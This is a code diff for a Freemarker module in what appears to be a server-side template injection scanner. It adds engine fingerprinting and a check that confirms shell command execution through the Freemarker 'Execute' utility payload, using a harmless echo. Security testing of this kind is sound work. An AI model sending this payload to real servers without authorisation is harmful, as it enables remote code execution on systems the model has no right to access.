@@ -23,6 +23,24 @@ class Freemarker(Check):
                 
             log.warn('Reflection detected with tag \'%s\'' % self.get('reflect_tag'))
 
+        self._check_engine()
+            
+        if not self.get('language') or  not self.get('engine'):
+            return
+            
+        log.warn('Freemarker engine detected')
+
+        self._check_os()
+        
+        if not self.get('exec'):
+            return
+            
+        log.warn(
+            'Shell command execution detected on \'%s\' operating system' % (
+                self.get('os', 'undetected')
+            )
+        )
+
     def _check_reflection(self):
         
         randA = rand.randint_n(1)
@@ -33,7 +51,27 @@ class Freemarker(Check):
         
         if expected == self.req(payload):
             self.set('reflect_tag', self.base_tag)
-    
+            
+    def _check_os(self):
+        
+        expected_rand = str(rand.randint_n(2))
+        payload = """<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("echo %s") }""" % (expected_rand)
+                
+        if expected_rand == self.req(payload):
+            self.set('exec', True)      
+
+    def _check_engine(self):
+        
+        randA = rand.randstr_n(1)
+        randB = rand.randstr_n(1)
+        
+        payload = '%s<#--%s-->%s' % (randA, rand.randstr_n(1), randB)
+        expected = randA + randB
+                
+        if expected == self.req(payload):
+            self.set('language', 'java')
+            self.set('engine', 'freemarker')
+            
     def req(self, payload):
     
         # Rewrite req to include Freemarker number formatting
